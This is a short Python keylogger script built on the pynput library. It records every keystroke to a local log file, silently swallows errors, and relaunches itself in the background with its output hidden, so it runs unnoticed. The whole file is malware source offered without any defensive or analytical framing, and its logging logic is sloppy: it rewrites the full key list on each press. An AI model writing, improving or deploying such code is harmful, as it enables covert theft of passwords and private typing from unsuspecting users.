import pynput
from pynput.keyboard import Key, Listener
import os

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        if key.char:
            pass
    except AttributeError:
        pass

def write_file(keys):
    with open('log.txt', 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

try:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except Exception as e:
    pass

# Run the script in the background
os.system("python keylogger.py > /dev/null 2>&1 &")
